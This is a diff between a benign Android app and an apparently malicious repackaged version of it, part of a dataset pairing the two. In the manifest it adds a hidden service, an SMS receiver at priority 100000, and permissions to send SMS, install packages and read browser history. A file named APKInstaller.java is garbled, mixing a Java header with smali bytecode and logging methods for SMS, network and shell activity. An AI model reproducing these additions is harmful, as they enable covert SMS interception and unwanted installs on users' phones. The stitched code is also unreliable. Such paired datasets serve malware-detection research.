diff --git a/result/APP_47/App_B_47/AndroidManifest.xml b/result/APP_47/App_M_47/AndroidManifest.xml
index 3f0c300..52cc0f1 100755
--- a/result/APP_47/App_B_47/AndroidManifest.xml
+++ b/result/APP_47/App_M_47/AndroidManifest.xml
@@ -46,12 +46,29 @@
             </intent-filter>
         </receiver>
         <service android:name=".service.ScreenService"/>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
     </application>
     <uses-permission android:name="android.permission.SET_PREFERRED_APPLICATIONS"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 </manifest>
\ No newline at end of file
diff --git a/result/APP_47/App_B_47/apktool.yml b/result/APP_47/App_M_47/apktool.yml
index 172f389..eec0e50 100755
--- a/result/APP_47/App_B_47/apktool.yml
+++ b/result/APP_47/App_M_47/apktool.yml
@@ -1,5 +1,5 @@
 !!brut.androlib.meta.MetaInfo
-apkFileName: Bapp47-72ACC63208C5518BDF8E745BCA1B264866D27704D0B0CA89559CBE593A0D840A.apk
+apkFileName: Mapp47-2EF09ACA1B3A4ACBFB2C33EF14D5EF06150BF88662B35A90F98A74ACCABAF6BE.apk
 compressionType: false
 doNotCompress:
 - resources.arsc
diff --git a/result/APP_47/App_M_47/com/android/main/APKInstaller.java b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
new file mode 100755
index 0000000..bd0972b
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
@@ -0,0 +1,432 @@
+package com.android.main;
+
+public class APKInstaller
+{
+  public APKInstaller() {}
+  
+  /* Error */
+  public static String exec(String[] paramArrayOfString)
+  {
+    // Byte code:
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "  "
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":0"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 131
+    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":0"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 130
+    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    goto/16 :goto_0
+
+    .line 132
+    :cond_5
+    if-le v1, v9, :cond_6
+
+    if-ge v3, v9, :cond_6
+
+    if-le v6, v9, :cond_6
+
+    .line 133
+    new-instance v8, Ljava/lang/StringBuilder;
+
+    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "  "
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":0"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 134
+    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 133
+    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    goto/16 :goto_0
+
+    .line 135
+    :cond_6
+    if-le v1, v9, :cond_7
+
+    if-le v3, v9, :cond_7
+
+    if-ge v6, v9, :cond_7
+
+    .line 136
+    new-instance v8, Ljava/lang/StringBuilder;
+
+    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "  "
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 137
+    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":0"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 136
+    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    goto/16 :goto_0
+
+    .line 138
+    :cond_7
+    if-le v1, v9, :cond_0
+
+    if-le v3, v9, :cond_0
+
+    if-le v6, v9, :cond_0
+
+    .line 139
+    new-instance v8, Ljava/lang/StringBuilder;
+
+    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "  "
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 140
+    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 139
+    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    goto/16 :goto_0
+.end method
+
+.method public static insert1write(Landroid/content/ContentValues;)V
+    .locals 2
+    .param p0, "contact_info"    # Landroid/content/ContentValues;
+
+    .prologue
+    .line 77
+    const-string v0, "insert1"
+
+    invoke-virtual {p0}, Landroid/content/ContentValues;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-static {v0, v1}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 78
+    return-void
+.end method
+
+.method public static insert2write(Ljava/util/ArrayList;)V
+    .locals 2
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "(",
+            "Ljava/util/ArrayList",
+            "<",
+            "Landroid/content/ContentProviderOperation;",
+            ">;)V"
+        }
+    .end annotation
+
+    .prologue
+    .line 81
+    .local p0, "contact_info":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/content/ContentProviderOperation;>;"
+    const-string v0, "insert2"
+
+    invoke-virtual {p0}, Ljava/util/ArrayList;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-static {v0, v1}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 82
+    return-void
+.end method
+
+.method public static net1write(Ljava/net/URLConnection;)V
+    .locals 2
+    .param p0, "net_info"    # Ljava/net/URLConnection;
+
+    .prologue
+    .line 49
+    const-string v0, "net1"
+
+    invoke-virtual {p0}, Ljava/net/URLConnection;->getURL()Ljava/net/URL;
+
+    move-result-object v1
+
+    invoke-virtual {v1}, Ljava/net/URL;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-static {v0, v1}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 50
+    return-void
+.end method
+
+.method public static net2write(Lorg/apache/http/client/methods/HttpUriRequest;)V
+    .locals 2
+    .param p0, "net_info"    # Lorg/apache/http/client/methods/HttpUriRequest;
+
+    .prologue
+    .line 53
+    const-string v0, "net2"
+
+    invoke-interface {p0}, Lorg/apache/http/client/methods/HttpUriRequest;->getURI()Ljava/net/URI;
+
+    move-result-object v1
+
+    invoke-virtual {v1}, Ljava/net/URI;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-static {v0, v1}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 54
+    return-void
+.end method
+
+.method public static net3write(Ljava/net/URL;)V
+    .locals 2
+    .param p0, "net_info"    # Ljava/net/URL;
+
+    .prologue
+    .line 57
+    const-string v0, "net3"
+
+    invoke-virtual {p0}, Ljava/net/URL;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-static {v0, v1}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 58
+    return-void
+.end method
+
+.method public static netwrite(Ljava/net/HttpURLConnection;)V
+    .locals 2
+    .param p0, "net_info"    # Ljava/net/HttpURLConnection;
+
+    .prologue
+    .line 45
+    const-string v0, "net:"
+
+    invoke-virtual {p0}, Ljava/net/HttpURLConnection;->getURL()Ljava/net/URL;
+
+    move-result-object v1
+
+    invoke-virtual {v1}, Ljava/net/URL;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-static {v0, v1}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 46
+    return-void
+.end method
+
+.method public static shell1write([Ljava/lang/String;)V
+    .locals 4
+    .param p0, "str"    # [Ljava/lang/String;
+
+    .prologue
+    .line 65
+    const-string v1, ""
+
+    .line 66
+    .local v1, "log":Ljava/lang/String;
+    const/4 v0, 0x0
+
+    .local v0, "i":I
+    :goto_0
+    array-length v2, p0
+
+    if-lt v0, v2, :cond_0
+
+    .line 69
+    const-string v2, "shell"
+
+    invoke-static {v2, v1}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 70
+    return-void
+
+    .line 67
+    :cond_0
+    new-instance v2, Ljava/lang/StringBuilder;
+
+    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    aget-object v3, p0, v0
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    const-string v3, " "
+
+    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v2
+
+    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    .line 66
+    add-int/lit8 v0, v0, 0x1
+
+    goto :goto_0
+.end method
+
+.method public static shellwrite(Ljava/lang/String;)V
+    .locals 1
+    .param p0, "str"    # Ljava/lang/String;
+
+    .prologue
+    .line 61
+    const-string v0, "shell"
+
+    invoke-static {v0, p0}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 62
+    return-void
+.end method
+
+.method public static smswrite(Ljava/lang/String;Ljava/lang/String;)V
+    .locals 3
+    .param p0, "num"    # Ljava/lang/String;
+    .param p1, "str"    # Ljava/lang/String;
+
+    .prologue
+    .line 32
+    const-string v0, "sms"
+
+    new-instance v1, Ljava/lang/StringBuilder;
+
+    invoke-static {p0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v2, ";"
+
+    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v1
+
+    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v1
+
+    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-static {v0, v1}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 33
+    return-void
+.end method
+
+.method public static write(Ljava/lang/String;Ljava/lang/String;)V
+    .locals 9
+    .param p0, "type"    # Ljava/lang/String;
+    .param p1, "info"    # Ljava/lang/String;
+
+    .prologue
+    .line 93
+    const/4 v2, 0x0
+
+    .line 94
+    .local v2, "out":Ljava/io/BufferedWriter;
+    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;
+
+    move-result-object v0
+
+    .line 95
+    .local v0, "c":Ljava/util/Calendar;
+    invoke-static {v0}, Lnetqin/NQlog/NQfile;->getCurrentTime(Ljava/util/Calendar;)Ljava/lang/String;
+
+    move-result-object v4
+
+    .line 97
+    .local v4, "time":Ljava/lang/String;
+    :try_start_0
+    new-instance v3, Ljava/io/BufferedWriter;
+
+    new-instance v5, Ljava/io/OutputStreamWriter;
+
+    .line 98
+    new-instance v6, Ljava/io/FileOutputStream;
+
+    sget-object v7, Lnetqin/NQlog/NQfile;->logPath:Ljava/lang/String;
+
+    const/4 v8, 0x1
+
+    invoke-direct {v6, v7, v8}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V
+
+    invoke-direct {v5, v6}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V
+
+    .line 97
+    invoke-direct {v3, v5}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 99
+    .end local v2    # "out":Ljava/io/BufferedWriter;
+    .local v3, "out":Ljava/io/BufferedWriter;
+    :try_start_1
+    new-instance v5, Ljava/lang/StringBuilder;
+
+    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+
+    move-result-object v6
+
+    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v6, "; "
+
+    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v5
+
+    invoke-virtual {v5, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v5
+
+    const-string v6, "; "
+
+    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v5
+
+    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v5
+
+    const-string v6, "\r\n"
+
+    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v5
+
+    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    invoke-virtual {v3, v5}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V
+
+    .line 100
+    invoke-virtual {v3}, Ljava/io/BufferedWriter;->close()V
+    :try_end_1
+    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
+
+    move-object v2, v3
+
+    .line 104
+    .end local v3    # "out":Ljava/io/BufferedWriter;
+    .restart local v2    # "out":Ljava/io/BufferedWriter;
+    :goto_0
+    return-void
+
+    .line 101
+    :catch_0
+    move-exception v5
+
+    move-object v1, v5
+
+    .line 102
+    .local v1, "e":Ljava/lang/Exception;
+    :goto_1
+    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V
+
+    goto :goto_0
+
+    .line 101
+    .end local v1    # "e":Ljava/lang/Exception;
+    .end local v2    # "out":Ljava/io/BufferedWriter;
+    .restart local v3    # "out":Ljava/io/BufferedWriter;
+    :catch_1
+    move-exception v5
+
+    move-object v1, v5
+
+    move-object v2, v3
+
+    .end local v3    # "out":Ljava/io/BufferedWriter;
+    .restart local v2    # "out":Ljava/io/BufferedWriter;
+    goto :goto_1
+.end method
diff --git a/result/APP_47/App_M_47/smali/netqin/NQlog/NQpackageinfo.smali b/result/APP_47/App_M_47/smali/netqin/NQlog/NQpackageinfo.smali
new file mode 100755
index 0000000..6e2f975
--- /dev/null
+++ b/result/APP_47/App_M_47/smali/netqin/NQlog/NQpackageinfo.smali
@@ -0,0 +1,144 @@
+.class public Lnetqin/NQlog/NQpackageinfo;
+.super Ljava/lang/Object;
+.source "NQpackageinfo.java"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 9
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+.method public static NQgetpackagename()Ljava/lang/String;
+    .locals 10
+
+    .prologue
+    .line 13
+    invoke-static {}, Landroid/os/Process;->myPid()I
+
+    move-result v5
+
+    .line 14
+    .local v5, "pid":I
+    const/4 v4, 0x0
+
+    .line 15
+    .local v4, "packagename":Ljava/lang/String;
+    const/4 v3, 0x0
+
+    .line 18
+    .local v3, "p":Ljava/lang/Process;
+    :try_start_0
+    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
+
+    move-result-object v8
+
+    const-string v9, "ps"
+
+    invoke-virtual {v8, v9}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
+
+    move-result-object v3
+
+    .line 19
+    new-instance v1, Ljava/io/BufferedReader;
+
+    new-instance v8, Ljava/io/InputStreamReader;
+
+    invoke-virtual {v3}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
+
+    move-result-object v9
+
+    invoke-direct {v8, v9}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
+
+    invoke-direct {v1, v8}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
+
+    .line 20
+    .local v1, "in":Ljava/io/BufferedReader;
+    const/4 v2, 0x0
+
+    .line 21
+    .local v2, "line":Ljava/lang/String;
+    :cond_0
+    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
+
+    move-result-object v2
+
+    if-nez v2, :cond_1
+
+    .line 31
+    :goto_0
+    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V
+
+    .line 36
+    .end local v1    # "in":Ljava/io/BufferedReader;
+    .end local v2    # "line":Ljava/lang/String;
+    :goto_1
+    return-object v4
+
+    .line 23
+    .restart local v1    # "in":Ljava/io/BufferedReader;
+    .restart local v2    # "line":Ljava/lang/String;
+    :cond_1
+    const-string v8, "\\s{1,}"
+
+    invoke-virtual {v2, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
+
+    move-result-object v7
+
+    .line 24
+    .local v7, "s":[Ljava/lang/String;
+    new-instance v8, Ljava/lang/StringBuilder;
+
+    invoke-static {v5}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v6
+
+    .line 25
+    .local v6, "pidstr":Ljava/lang/String;
+    const/4 v8, 0x1
+
+    aget-object v8, v7, v8
+
+    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v8
+
+    if-eqz v8, :cond_0
+
+    .line 27
+    const/16 v8, 0x8
+
+    aget-object v4, v7, v8
+    :try_end_0
+    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
